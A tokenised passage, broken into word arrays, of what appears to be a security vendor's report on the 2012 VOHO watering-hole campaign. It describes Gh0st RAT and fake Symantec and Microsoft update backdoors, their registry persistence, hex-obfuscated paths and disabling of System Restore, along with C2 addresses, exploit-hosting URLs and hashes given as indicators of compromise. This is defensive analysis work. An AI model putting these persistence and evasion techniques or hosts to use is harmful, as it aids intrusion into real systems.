["That", "is", ",", "entities", "and", "people", "that", "seek", "to", "promote", "democratic", "government", "in", "countries", "whose", "existing", "political", "structure", "and", "power", "does", "n\u2019t", "support", "(", "and", "indeed", ",", "persecutes", ")", "such", "governmental", "change", "."], ["This", "particular", "strategic", "vector", "has", "been", "observed", "in", "prior", "nation", "-", "state", "sponsored", "attacks", "."], ["Though", "several", "sites", "were", "targeted", "by", "the", "adversarial", "element", "behind", "this", "campaign", "some", "stood", "out", "due", "to", "their", "relationships", "to", "matters", "of", "geopolitical", "relevance", ",", "philanthropy", ",", "and", "news", "media", "."], ["Five", "primary", "sites", "were", "compromised", "and", "used", "as", "pivot", "sites", "from", "a", "water", "holing", "perspective", "in", "this", "campaign", "."], ["They", "were", "largely", "North", "American", "with", "the", "exception", "of", "one", "European", "example", "."], ["Additionally", ",", "a", "large", "percentage", "of", "infection", "activity", "occurred", "as", "a", "result", "of", "sites", "compromised", "and", "converted", "into", "water", "holes", "that", "offered", "services", "to", "the", "Washington", ",", "DC", "and", "Boston", ",", "MA", "areas", "."], ["As", "the", "political", "and", "governmental", "hub", "of", "the", "United", "States", "of", "America", ",", "wholesale", "compromise", "of", "computers", "in", "this", "area", "would", "provide", "a", "wealth", "of", "intelligence", "for", "adversaries", "interested", "in", "political", "process", "and", "government", "action", "."], ["Furthermore", "it", "should", "be", "noted", "that", "RSA", "FirstWatch", "has", "noted", "and", "verified", "the", "compromise", "of", "nearly", "one", "thousand", "unique", "organizations", "distinct", "from", "those", "noted", "within", "this", "work", "."], ["9", "Figure", "7", ":", "Industries", "and", "Regions"], ["Leveraged", "in", "\u201c", "Water", "Holing", "\u201d", "Activity", "Political"], ["Activism", "Metro", "Washington", ",", "DC", "\u2022", "Government", "\u2022"], ["Education", "\u201c", "Watering", "Hole", "\u201d", "Pivot"], ["Sites", "Defense", "Industrial", "Base", "Metro", "Boston", "\u2022"], ["Financial"], ["Svcs", "Gh0st", "RAT", "RAT", "Overview", "Remote", "Access", "Tools\\Trojan"], ["(", "RAT", ")", "are", "typically", "offered", "as", "a", "\u201c", "legitimate", "\u201d", "remote", "administration", "tool", "for", "system", "administrators", ",", "but", "have", "largely", "been", "used", "for", "remote", "hacking", "and", "information", "collection", "for", "intelligence", "purposes", "or", "lateral", "movement", "activities", "."], ["While", "they", "are", "similar", "in", "function", "to", "purpose", "-", "built", "botnets", ",", "which", "also", "tend", "to", "use", "client", "/", "server", "architecture", ",", "RATs", "typically", "offer", "a", "wide", "range", "of", "features", "rather", "than", "the", "single", "focus", "that", "most", "modern", "botnet", "malware", "adheres", "to", "."], ["Typically", ",", "RATs", "have", "the", "ability", "to", ":", "\u2022", "Capture", "keystrokes", "\u2022", "Remote", "monitoring", "of", "webcam", "and/or", "microphone", "\u2022", "File", "system", "search", "/", "browse", "\u2022", "Use", "of", "local", "command", "prompt", "\u2022", "Execution", "of", "arbitrary", "programs", "\u2022", "File", "download", "/", "upload", "Gh0st", "RAT", "Specifics", "Gh0st", "came", "to", "prominence", "following", "the", "2009", "publication", "of", "\u201c", "Tracking", "Ghostnet", ":"], ["Investigating", "a", "Cyber", "Espionage", "Network", "\u201d", ",", "in", "which", "this", "malware", "was", "used", "to", "infiltrate", "computers", "associated", "with", "the", "Dalai", "Lama", "and", "was", "used", "to", "compromise", "information", "related", "to", "Tibetan", "affairs", "."], ["Gh0st", "contains", "all", "of", "the", "above", "-", "mentioned", "capabilities", "when", "successfully", "installed", "on", "a", "target", "PC", "."], ["An", "excellent", "overview", "of", "this", "tool", "can", "be", "found", "in", "the", "McAfee", "report", "titled", "\u201c", "Know", "your", "Digital", "Enemy", "\u201d", "ix", "."], ["10"], ["Since", "the", "publication", "of", "this", "report", ",", "the", "use", "of", "gh0st", "in", "hacking", "incidents", "has", "exploded", ",", "with", "the", "RSA", "FirstWatch", "team", "being", "aware", "of", "at", "least", "50", "unique", "gh0st", "networks", "."], ["This", "can", "be", "largely", "explained", ",", "much", "like", "the", "proliferation", "of", "ZeuS", "cybercrime", "malware", ",", "to", "the", "open", "availability", "of", "Gh0st", "source", "code", "on", "the", "internet", "."], ["When", "source", "code", "for", "this", "type", "of", "malware", "is", "available", "globally", "it", "allows", "\u201c", "open", "source", "\u201d", "evolution", "of", "the", "malware", "to", "add", "new", "features", "and", "capabilities", ",", "but", "more", "importantly", ",", "it", "permits", "the", "constant", "modification", "of", "\u201c", "indicators", "\u201d", "used", "by", "defenders", "to", "detect", "malware", "activity", "in", "their", "environment", "."], ["From", "an", "operational", "sense", ",", "having", "easy", "opportunity", "to", "modify", "source", "code", "allows", "a", "much", "more", "robust", "compromise", ",", "with", "decreased", "likelihood", "of", "attacker", "detection", "."], ["In", "many", "cases", "this", "detection", "is", "based", "on", ":", "1", ")", "Knowledge", "of", "known", "C2", "locations", "2", ")", "Detection", "of", "a", "common", "\u201c", "gh0st", "\u201d", "string", "that", "is", "seen", "in", "the", "network", "communication", "of", "\u201c", "unmodified", "\u201d", "gh0st", "configurations", "."], ["Figure", "8", ":", "Common", "Technique"], ["Empolyed", "by", "Gh0st", "Networks", "Operators", "A", "common", "countermeasure", "used", "by", "operators", "of", "gh0st", "networks", "is", "to", "change", "this", "gh0st", "string", "prior", "to", "malware", "compilation", "to", "defeat", "basic", "IDS", "signatures", "."], ["VOHO", "Sample", "Analysis"], ["Fake", "Symantec", "Update", "\u2013", "Variant", "1", "VPTray", ".", "EXE"], ["e6b43c299a9a1f5abd9be2b729e54577"], ["This", "malware", "comes", "in", "a", "UPX", "compressed", "binary", ",", "which", "disguises", "itself", "as", "an", "update", "from", "Symantec", "but", "instead", "it", "installs", "a", "backdoor", "in", "the", "target", "system", "."], ["When", "the", "malware", "is", "first", "executed", ",", "its", "first", "order", "of", "business", "is", "to", "install", "itself", "in", "the", "system", "."], ["It", "does", "this", "by", "dropping", "an", "exact", "copy", "of", "itself", "with", "the", "name", "VPTray", "."], ["EXE", "in", "the", "current", "user", "\u2019s"], ["\u201c", "Local", "Settings\\Temp", "\u201d", "folder", "."], ["It", "then", "modifies", "the", "Windows", "registry", "for", "it", "to", "autostart", "every", "boot", "up", "."], ["It", "does", "this", "by", "using", "the", "following", "registry", "keys", "."], ["\u2022", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run", "\u2022", "HKEY_USERS\\<User", "\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run", "11"], ["By", "using", "the", "HKCU", "and", "HKU", "registry", "hives", ",", "the", "malware", "is", "targeting", "users", "that", "are", "currently", "logged", "into", "the", "machine", "when", "the", "initial", "infection", "began", "instead", "of", "the", "machine", "itself", "."], ["This", "technique", "is", "especially", "useful", "when", "the", "target", "uses", "roaming", "profiles", "."], ["The", "malware", "adds", "the", "value", "\u201c", "SymantecUpdate", "\u201d", "to", "these", "keys", "and", "pass", "itself", "off", "as", "an", "update", "from", "Symantec", "."], ["This", "is", "a", "simple", "technique", "that", "is", "designed", "to", "fool", "the", "untrained", "eye", "."], ["To", "reinforce", "this", ",", "the", "malware", "employs", "a", "certain", "level", "of", "obfuscation", "to", "hide", "the", "data", ",", "which", "is", "the", "location", "and", "filename", "of", "the", "malware", ",", "by", "using", "HEX", "digits", "to", "represent", "each", "string", "characters", "instead", "of", "the", "more", "common", "ASCII", "."], ["In", "this", "case", ",", "instead", "of", "the", "data", "being", ":", "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\VPTray.exe"], ["It", "is", "represented", "in", "the", "registry", "as", ":", "43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31", ":"], ["5c:54:65:6d:70:5c:56:50:54:72:61:79:2e:65:78:65:00", "."], ["This", "installation", "technique", "of", "dropping", "an", "exact", "copy", "of", "itself", "tells", "us", "that", "the", "malware", "can", "survive", "and", "install", "itself", "without", "the", "aid", "of", "a", "dropper", "or", "a", "downloader", "."], ["It", "has", "the", "capability", "to", "check", "whether", "it", "is", "running", "in", "the", "appropriate", "location", "and", "if", "it", "is", "properly", "installed", "on", "the", "system", "."], ["If", "not", ",", "it", "proceeds", "with", "the", "installation", "process", "."], ["This", "technique", "is", "advantageous", "if", "the", "malware", "has", "not", "been", "removed", "properly", "."], ["A", "surviving", "main", "component", "can", "recreate", "what", "was", "removed", "including", "the", "necessary", "registry", "changes", "needed", "by", "the", "malware", "."], ["Aside", "from", "dropping", "VPTray", "."], ["EXE", "it", "also", "drops", "the", "binary", "file", "UP.BAK", "in", "the", "same", "\u201c", "Local", "Settings\\Temp", "\u201d", "folder", "."], ["This", "is", "the", "backdoor", "component", "of", "the", "malware", "."], ["Once", "all", "of", "these", "are", "accomplished", ",", "the", "original", "malware", "passes", "control", "to", "VPTray", "."], ["EXE", "and", "then", "deletes", "itself", "to", "remove", "any", "traces", "of", "its", "existence", "."], ["Figure", "9", ":", "Memory", "dump", "of", "the", "malware", "containing", "the", "strings", "of", "the", "filenames", "of", "the", "dropped", "files", "and", "the", "registry", "value", "."], ["12"], ["Once", "the", "malware", "is", "active", "in", "the", "system", "it", "utilizes", "certain", "protective", "mechanisms", "such", "as", "the", "following", ":", "\u2022", "Registry", "Editor", "is", "disabled", "\u2022", "Windows", "System", "Restore", "is", "disabled", "Disabling", "the", "registry", "editor", "prevents", "the", "auditing", "and", "review", "of", "registry", "entries", ",", "especially", "those", "that", "are", "commonly", "utilized", "by", "malware", "for", "persistency", "while", "the", "disabling", "of", "Windows"], ["System", "Restore", "prevents", "the", "user", "from", "reverting", "the", "system", "to", "a", "known", "good", "state", "before", "infection", "occurred", "."], ["The", "malware", "also", "wipes", "out", "all", "the", "restore", "points", "that", "are", "present", "in", "the", "system", "before", "infection", "."], ["The", "main", "component", ",", "VPTray", ".", "EXE", ",", "is", "the", "one", "that", "communicates", "directly", "to", "the", "botnet", "command", "and", "control", "."], ["It", "connects", "to", "IP", "134.255.242.47", "via", "HTTPS", "."], ["It", "remains", "active", "in", "the", "system", "listening", "constantly", "for", "instructions", "while", "keeping", "the", "other", "components", "in", "check", "."], ["Figure", "10", ":", "VPTray.exe", "connecting", "to", "IP", "134.255.242.47", "."], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system", ":", "\u2022", "Presence", "of", "VPTray", "."], ["EXE", "and", "UP.BAK", "in", "the", "User", "\u2019s", "\u201c", "Local", "Settings\\Temp", "\u201d", "folder", "."], ["An", "infected", "Administrator", "account", "in", "Windows", "XP", "will", "have", "these", "files", "in", "C:\\DOCUMENTS", "AND", "SETTINGS\\ADMINISTRATOR\\LOCAL", "SETTINGS\\Temp\\", "\u2022", "Presence", "of", "the", "registry", "value", "\u201c", "SymantecUpdate", "\u201d", "with", "data", "in", "HEX", "values", "representing", "the", "file", "and", "location", "of", "VPTray", "."], ["EXE", "in", "the", "following", "registry", "keys", ":", "o", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run", "o", "HKEY_USERS\\<User", "\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run", "\u2022", "Presence", "of", "running", "process", "VPTray", "."], ["EXE", "\u2022", "Unable", "to", "use", "the", "Registry", "Editor", "\u2022", "Unable", "to", "use", "Windows", "System", "Restore", "Fake", "Symantec", "Update", "\u2013", "Variant", "2"], ["Dropper", "acc583fc596d38626d37cbf6de8a01cb", "VPTray", ".", "EXE", "b894efe4173f90479fddff455daf6ff3"], ["Unlike", "the", "first", "variant", ",", "this", "one", "is", "not", "compressed", "."], ["Both", "the", "dropper", "and", "the", "dropped", "file", "(", "VPTray", ".", "EXE", ")", "are", "not", "compressed", "."], ["Other", "difference", "it", "has", "with", "the", "first", "variant", "is", "the", "location", "of", "the", "dropped", "file", "and", "the", "way", "persistency", "is", "achieved", "."], ["But", "its", "modus", "operandi", "remains", "the", "same", ",", "and", "that", "is", "to", "pretend", "to", "be", "a", "Symantec", "Live", "Update", "."], ["When", "the", "dropper", "is", "executed", ",", "it", "drops", "VPTray", "."], ["EXE", "in", "C:\\Program", "Files\\Symantec\\LiveUpdate\\."], ["Having", "these", "file", "in", "a", "Symantec", "folder", "in", "Program", "Files", "is", "already", "a", "red", "flag", "especially", "if", "the", "compromised", "machine", "does", "not", "have", "a", "Symantec", "product", "installed", "."], ["13"], ["It", "then", "adds", "the", "registry", "key", "below", "to", "achieve", "persistency", "."], ["\u2022", "Key", ":", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run", "\u2022", "Value", ":", "Symantec", "LiveUpdate", "\u2022", "Data", ":", "C:\\Program", "Files\\Symantec\\LiveUpdate\\VPTray.exe", "Obviously", ",", "the", "way", "it", "achieves", "persistency", "is", "totally", "different", "from", "variant", "1", "."], ["\u2022", "Variant", "2", "used", "a", "different", "registry", "hive", "\u2022", "Variant", "2", "\u2019s", "registry", "value", "is", "SymantecLiveUpdate", "compared", "to", "SymantecUpdate", "in", "variant", "1", "\u2022"], ["The", "registry", "data", "is", "in", "ASCII", "and", "not", "in", "HEX", "."], ["This", "is", "fine", "because", "the", "malware", "file", "is", "located", "in", "a", "created", "Symantec", "folder", "in", "Program", "Files", "."], ["Figure", "11", ":", "Memory", "Dump", "of", "the"], ["Malware", "Containing", "the", "Strings", "of", "the"], ["Filenames", "To", "ensure", "its", "survival", ",", "the", "Windows", "System", "Restore", "is", "disabled", "."], ["But", "unlike", "the", "first", "variant", ",", "this", "one", "did", "not", "disable", "the", "registry", "editor", "due", "to", "the", "fact", "that", "the", "added", "registry", "value", "and", "data", "appears", "to", "be", "legitimate", "because", "it", "utilizes", "a", "location", "of", "the", "file", "that", "appears", "to", "be", "a", "normal", "location", "for", "a", "Symantec", "file", "."], ["To", "communicate", "to", "the", "attacker", "the", "main", "component", ",", "VPTray", ".", "EXE", ",", "connects", "to", "the", "domain", "usc-data.suroot.com", "."], ["14"], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system", ":", "\u2022", "Presence", "of", "VPTray", "."], ["EXE", "in", "C:\\Program", "Files\\Symantec\\LiveUpdate\\", "\u2022", "Presence", "of", "the", "registry", "value", "\u201c", "SymantecLiveUpdate", "\u201d", "with", "the", "data", "\u201c", "C:\\Program", "Files\\Symantec\\LiveUpdate\\VPTray", "."], ["EXE", "\u201d", "in"], ["HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run", "\u2022", "Presence", "of", "running", "process", "VPTray", "."], ["EXE", "\u2022", "Unable", "to", "use", "Windows", "System", "Restore", "*", "*"], ["As", "of", "this", "writing", ",", "the", "main", "component", ",", "VPTray", ".", "EXE", ",", "is", "not", "detected", "in", "VirusTotal", "using", "its", "hash", "search", "function", "."], ["Fake", "Microsoft", "Update", "Svohost", ".", "EXE"], ["2fe340fe2574ae540bd98bd9af8ec67d"], ["Similar", "to", "the", "Fake", "Symantec", "Update", ",", "this", "malware", "comes", "in", "a", "UPX", "compressed", "binary", "file", "."], ["It", "passes", "itself", "off", "as", "a", "Microsoft", "update", "but", "nothing", "can", "be", "further", "from", "the", "truth", "."], ["When", "the", "malware", "is", "first", "executed", ",", "it", "installs", "itself", "in", "the", "system", "similar", "to", "the", "method", "employed", "by", "the", "Fake", "Symantec", "Update", "."], ["The", "only", "difference", "is", "the", "file", "that", "is", "dropped", "and", "registry", "value", "and", "data", "it", "uses", "."], ["The", "file", "is", "dropped", "in", "the", "current", "user", "\u2019s", "\u201c", "Local", "Settings\\Temp", "\u201d", "folder", "and", "is", "named", "SVOHOST.EXE", ",", "which", "is", "an", "exact", "copy", "of", "the", "malware", "."], ["This", "technique", "of", "naming", "a", "file", "almost", "similar", "to", "a", "legitimate", "file", "(", "SVCHOST.EXE", ")", "is", "known", "as", "homographic", "obfuscation", "."], ["But", "in", "this", "case", ",", "the", "less", "elegant", "method", "is", "used", ",", "and", "that", "is", "to", "simply", "replace", "one", "letter", "with", "another", "."], ["To", "autostart", ",", "the", "malware", "utilized", "the", "same", "registry", "keys", "as", "the", "Fake", "Symantec", "Update", "."], ["\u2022", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run", "\u2022", "HKEY_USERS\\<User", "\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run"], ["By", "using", "these", "registry", "hives", ",", "the", "malware", "is", "able", "to", "target", "users", "that", "are", "currently", "logged", "into", "the", "machine", "even", "those", "that", "are", "not", "currently", "active", "in", "the", "system", "(", "think", "of", "Switch", "User", "mode", ")", "."], ["The", "malware", "adds", "the", "value", "\u201c", "Microsoft", "Update", "\u201d", "to", "these", "keys", "."], ["A", "common", "technique", ",", "a", "very", "typical", "malware", "deception", ",", "to", "fool", "users", "into", "believing", "it", "is", "something", "that", "it", "is", "not", "."], ["Aside", "from", "this", ",", "it", "also", "utilizes", "HEX", "digits", "to", "obfuscate", "the", "registry", "data", ",", "which", "represents", "the", "location", "and", "the", "filename", "of", "the", "malware", "."], ["So", "instead", "of", "the", "data", "being", "C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\svohost.exe", "for", "an", "infected", "Administrator", "account", "in", "Windows", "XP", ",", "it", "appears", "as", "43:3a:5c:44:4f:43:55:4d:45:7e:31:5c:41:44:4d:49:4e:49:7e:31:5c:4c:4f:43:41:4c:53:7e:31", ":"], ["5c:54:65:6d:70:5c:73:76:6f:68:6f:73:74:2e:65:78:65:00", "."], ["Once", "all", "the", "malware", "installation", "procedure", "is", "done", ",", "the", "original", "malware", "passes", "control", "to", "SVOHOST.EXE", "and", "deletes", "itself", "to", "hide", "any", "traces", "of", "its", "existence", "."], ["Once", "the", "malware", "is", "active", "in", "the", "system", "it", "utilizes", "certain", "protective", "mechanisms", "such", "as", "the", "following", ":", "\u2022", "Registry", "Editor", "is", "disabled", "\u2022", "Windows", "System", "Restore", "is", "disabled", "15", "Disabling", "the", "registry", "editor", "prevents", "the", "auditing", "and", "review", "of", "registry", "entries", ",", "especially", "those", "that", "are", "commonly", "utilized", "by", "malware", "for", "persistency", "while", "the", "disabling", "of", "Windows"], ["System", "Restore", "prevents", "the", "user", "from", "reverting", "the", "system", "to", "a", "known", "good", "state", "before", "infection", "occurred", "."], ["The", "malware", "also", "wipes", "out", "all", "the", "restore", "points", "that", "are", "present", "in", "the", "system", "before", "infection", "."], ["To", "communicate", "to", "the", "attacker", ",", "the", "malware", "connects", "to", "IP"], ["58.64.155.59", "."], ["Figure", "12", ":", "SVOHOST.EXE", "connecting", "to", "58.64.155.59", "."], ["The", "following", "symptoms", "can", "be", "observed", "in", "an", "infected", "system", "."], ["\u2022", "Presence", "of", "SVOHOST.EXE", "in", "the", "User", "\u2019s", "\u201c", "Local", "Settings\\Temp", "\u201d", "folder", "."], ["An", "infected", "Administrator", "account", "in", "Windows", "XP", "will", "have", "these", "files", "in", "C:\\DOCUMENTS", "AND", "SETTINGS\\ADMINISTRATOR\\LOCAL", "SETTINGS\\Temp\\", "\u2022", "Presence", "of", "the", "registry", "value", "\u201c", "Microsoft", "Update", "\u201d", "with", "data", "in", "HEX", "values", "representing", "the", "file", "and", "location", "of", "SVOHOST.EXE", "in", "the", "following", "registry", "keys", ":", "o", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Current\\Version\\Run", "o", "HKEY_USERS\\<User", "\u2019s", "Security", "ID>\\Software\\Microsoft\\Windows\\Current\\Version\\Run", "\u2022", "Presence", "of", "running", "process", "SVOHOST.EXE", "\u2022", "Unable", "to", "use", "the", "Registry", "Editor", "\u2022", "Unable", "to", "use", "Windows", "System", "Restore", "VOHO", "Campaign", "Analysis", "RSA", "FirstWatch", "research", "examined", "HTTP", "logs", "covering", "the", "June", "/", "July", "2012", "timeframe", "for", "the", "exploit", "chain", "in", "this", "example", "."], ["This", "analysis", ",", "combined", "with", "a", "detailed", "understanding", "of", "the", "exploit", "mechanism", ",", "allowed", "the", "team", "to", "get", "a", "better", "understanding", "of", "the", "scope", "of", "compromise", "of", "this", "campaign", "."], ["Based", "on", "our", "analysis", ",", "we", "can", "determine", "that", "this", "attack", "was", "broken", "up", "into", "two", "phases", "."], ["Phase", "1"], ["We", "observed", "referral", "traffic", "begin", "on", "June", "25", ",", "2012", "to", "the", "exploit", "site", "."], ["However", ",", "according", "to", "the", "server", "logs", ",", "actual", "exploitation", "of", "Internet", "Explorer", "began", "on", "July", "9", ",", "2012", "at", "approximately", "7:56", "AM", "EST", "when", "the", "first", "successful", "exploits", "of", "visiting", "browsers", "began", "to", "hit", "the", "exploit", "code", "."], ["We", "observed", "some", "movement", "of", "exploit", "code", "across", "directories", "on", "the", "*", "*", "*", "*", "*", "*", "*", "curling.com", "web", "server", "during", "the", "investigation", ",", "so", "this", "gap", "was", "likely", "caused", "by", "the", "attacker", "setting", "up", "a", "new", "campaign", "."], ["Phase", "1", "exploit", "activity", "continued", "over", "the", "course", "of", "two", "days", ",", "with", "continuous", "access", ",", "until", "July", "10th", ",", "when", "activity", "stopped", "at", "3:43", "pm", "EST", "."], ["Phase", "2", "Phase", "2", ",", "which", "consisted", "of", "the", "above", "mentioned", "attack", "on", "the", "Sun", "Java", "client", ",", "began", "on", "July", "16", ",", "2012", ",", "when", "the", "first", "successful", "exploits", "of", "visiting", "java", "clients", "began", "to", "hit", "the", "exploit", "server", "at", "approximately", "7:46am", "EST", "."], ["This", "exploit", "activity", "continued", "over", "the", "course", "of", "a", "few", "days", ",", "and", "ceased", "on", "July", "18", ",", "2012", ",", "at", "approximately", "9:12", "am", "EST", ",", "which", "was", "when", "the", "server", "administrator", "of", "*", "*", "*", "*", "*", "*", "*", "curling.com", "brought", "the", "server", "down", "for", "compromise", "remediation", "."], ["16", "Overall", "Statistics"], ["Based", "on", "our", "analysis", ",", "a", "total", "of", "32,160", "unique", "hosts", ",", "representing", "731", "unique", "global", "organizations", ",", "were", "redirected", "from", "compromised", "web", "servers", "injected", "with", "the", "redirect", "iframe", "to", "the", "exploit", "server", "."], ["Of", "these", "redirects", ",", "3,934", "hosts", "were", "seen", "to", "download", "the", "exploit", "CAB", "and", "JAR", "files", "(", "indicating", "a", "successful", "exploit", "/", "compromise", "of", "the", "visiting", "host", ")", "."], ["This", "gives", "a", "\u201c", "success", "\u201d", "statistic", "of", "12", "%", ",", "which", "based", "on", "our", "previous", "understanding", "of", "exploit", "campaigns", ",", "indicates", "a", "very", "successful", "campaign", "."], ["Figure", "13", ":", "Success", "of", "Compromise", "Total", "Exposure", "and", "Compromise", "35,000", "30,000", "25,000", "20,000", "15,000", "10,000", "5,000", "0"], ["Total", "Exposure", "by", "Redirect", "Total", "Compromises", "Of", "the", "listed", "sites", "used", "to", "redirect", "hosts", "to", "the", "exploit", "site", ",", "the", "top", "four", "redirecting", "web", "servers", "are", "as", "follows", ":", "Figure", "14", ":", "Top", "Four", "Redirect", "Sites", "With", "success", "rates", "per", "exploit", "type", "being", "split", "pretty", "much", "down", "the", "middle", ":", "17", "Exploit", "Breakdown", "Figure", "15", ":", "Exploit", "Breakdown", "CAB", "Downloads", "JAR", "Downloads", "Exploited", "Organization", "Breakdown"], ["Of", "the", "hosts", "above", "that", "downloaded", "the", "exploit", "CAB", "and", "JAR", "files", ",", "the", "RSA", "FirstWatch", "team", "further", "examined", "compromised", "organizations", "by", "identifying", "the", "visiting", "hosts", "and", "crossreferencing", "the", "IP", "addresses", "to", "the", "Autonomous", "Systems", "that", "they", "belonged", "to", "."], ["CAVEAT", ":", "Because", "we", "did", "n\u2019t", "have", "observation", "of", "the", "compromised", "host", "themselves", ",", "nor", "command", "and", "control", "traffic", ",", "our", "understanding", "of", "\u201c", "compromise", "\u201d", "is", "strictly", "-", "related", "to", "observed", "HTTP", "traffic", "."], ["This", "analysis", "would", "not", "take", "into", "account", "host", "or", "perimeter", "-", "based", "blocking", "systems", "at", "affected", "organizations", "."], ["With", "this", "data", "we", "then", "grouped", "those", "autonomous", "systems", "into", "the", "following", "industries", ":", "\u2022", "Corporate", "\u2013", "These", "systems", "were", "identified", "as", "being", "members", "of", "typical", "corporate", "networks", ",", "which", "included", "enterprises", "and", "business", ",", "as", "well", "as", "\u201c", "business", "-", "class", "\u201d", "IP", "space", "in", "large", "ISP", "organizations", "."], ["\u2022", "Defense", "Industrial", "Base", "(", "DIB", ")", "\u2013", "These", "systems", "were", "systems", "in", "ASNs", "that", "were", "\u2022", "Local", "Government", "\u2013", "These", "systems", "were", "systems", "in", "networks", "identified", "as", "known", "to", "be", "involved", "with", "DIB", "consulting", ",", "systems", "and", "process", "."], ["government", "systems", "in", "various", "cities", ",", "counties", "and", "towns", "."], ["\u2022", "Internet", "Service", "Provider", "(", "ISP", ")", "-"], ["These", "systems", "were", "hosts", "in", "networks", "that", "were", "identified", "as", "common", "internet", "service", "provider", "space", "."], ["This", "particular", "classification", "accounts", "largely", "for", "consumer", "-", "based", "internet", "users", ",", "but", "may", "also", "include", "corporate", "assets", "that", "are", "n\u2019t", "immediately", "identifiable", "by", "ASN", "examination", "."], ["\u2022", "Federal", "Government", "\u2013", "These", "systems", "are", "hosts", "in", "U.S.", "Government", "IP", "space", "or", "Washington", "DC", "area", "local", "government", "space", "."], ["This", "would", "include", "Federal", "agencies", "and", "support", "organizations", "."], ["\u2022", "Educational", "Institutions", "(", "EDU", ")", "\u2013", "These", "systems", "were", "hosts", "in", "networks", "identified", "as", "educational", "institutions", "."], ["Much", "like", "ISP", "traffic", ",", "this", "traffic", "is", "difficult", "to", "breakdown", "into", "more", "specific", "identifying", "information", "."], ["\u2022", "Financial", "Services", "Organizations", "\u2013", "These", "systems", "were", "systems", "in", "identifiable"], ["Bank", ",", "Credit", "Union", ",", "Trading", "and", "other", "organizations", "related", "to", "financial", "services", "."], ["\u2022", "Healthcare", "-", "These", "systems", "were", "hosts", "in", "identifiable", "healthcare", "industry", "space", "."], ["This", "would", "include", "hospital", ",", "pharmaceutical", ",", "patient", "services", "and", "clinic", "space", "."], ["\u2022", "Other", "Government", "\u2013", "These", "systems", "were", "national", "government", "systems", "identified", "in", "foreign", "IP", "space", "or", "global", "government", "organizations", "(", "example", ":", "United", "Nations", ")", "\u2022", "Utilities", "/", "SCADA", "-", "These", "systems", "were", "hosts", "identified", "in", "organizations", "that", "supply", "or", "support", "utility", "or", "SCADA", "-", "related", "services", "such", "as", "Energy", "and", "water", "services", "."], ["18", "Figure", "16", ":"], ["Compromises", "by", "Industry", "Compromises", "by", "Industry", "UTILITIES", "/", "SCADA"], ["OTHER", "GOVT", "LOCAL", "GOVT", "ISP", "HEALTHCARE"], ["FINANCIAL", "FED", "GOVT"], ["EDU"], ["DIB", "CORPORATE", "0", "500", "1,000", "1,500", "2,000", "2,500"], ["By", "removing", "ISP", "traffic", ",", "we", "are", "better", "able", "to", "examine", "the", "other", "industries", ":", "Figure", "17", ":", "Compromise", "by", "Industry", "without", "ISP"], ["Compromise"], ["By", "Industry", "(", "without", "ISP", ")"], ["UTILITIES", "/", "SCADA", "OTHER", "GOVT", "LOCAL", "GOVT"], ["HEALTHCARE"], ["FINANCIAL", "FED", "GOVT"], ["EDU"], ["DIB", "CORPORATE", "0", "200", "400", "600", "800"], ["Linked", "Campaigns", "Wsdhealthy.com", "xxixii"], ["Based", "on", "our", "understanding", "of", "this", "campaign", "and", "TTPs", "(", "tools", ",", "techniques", "and", "procedures", ")", "used", ",", "we", "believe", "the", "following", "malware", "samples", "observed", "in", "January", "2012", "are", "related", "and", "belong", "to", "the", "same", "threat", "actors", "."], ["03db29c71b0031af08081f5e2f7dcdf2"], ["644161889f0f60885b2a0eec12038b66", "19"], ["These", "samples", "communicated", "with", "C2", "at", "58.64.143.245", "."], ["This", "IP", "address", "has", "resolved", "to", "the", "following", "DNS", "names", "in", "the", "past", ":", "usc-data.suroot.com", "usa-mail.scieron.com", "dll.freshdns.org", "Delivery", "of", "these", "samples", "appeared", "to", "be", "a", "similar", "attack", "vector", ",", "that", "being", "a", "hacked", "server", "that", "was", "redirected", "to", "by", "iframe", "insertion", ":", "www.wsdhealthy.com", "Using", "the", "following", "URLs", ":", "www.wsdhealthy.com/userfiles/file/Applet19.html"], ["www.wsdhealthy.com/userfiles/file/Applet19.exe", "www.wsdhealthy.com/userfiles/file/Applet.html", "www.wsdhealthy.com/userfiles/file/Applet.jar"], ["www.wsdhealthy.com/userfiles/file/Applet.exe"], ["This", "file", "structure", "indicates", "a", "similar", "java", "exploitation", ",", "and", "while", "we", "did", "n\u2019t", "have", "direct", "observation", "of", "this", "campaign", ",", "open", "source", "intelligence", "indicates", "a", "possible", "exploit", "of", ":", "CVE\u20132011", "-", "3544", "-", "Unspecified", "vulnerability", "in", "the", "Java", "Runtime", "Environment"], ["Additionally", ",", "the", "Gh0st", "RAT", "variant", "used", "in", "this", "campaign", "matched", "identifiers", "used", "in", "the", "VOHO", "campaign", "."], ["Detection", "and", "Indicators", "of", "Compromise", "Network"], ["For", "network", "detection", "of", "this", "threat", ",", "users", "should", "look", "for", "historic", "traffic", "to", "the", "following", "IPs", "and", "Domains", ":", "IP", "Addresses"], ["58.64.155.59", "(", "gh0st", "RAT", "C2", ")"], ["58.64.155.57", "(", "gh0st", "RAT", "C2", ")"], ["58.64.143.245", "(", "gh0st", "RAT", "C2", ")"], ["Domains", "wsdhealthy.com", "(", "legitimate", "site", "hosting", "exploit", "code", "/", "malware", ")", "*", "*", "*", "*", "*", "*", "*", "curling.com", "(", "legitimate", "site", "hosting", "exploit", "code", "/", "malware", ")"], ["usc-data.suroot.com", "(", "gh0st", "RAT", "C2", ")"], ["usa-mail.scieron.com", "(", "gh0st", "RAT", "C2", ")"], ["dll.freshdns.org", "(", "gh0st", "RAT", "C2", ")", "20", "Gh0st"], ["RAT"], ["Generically", ",", 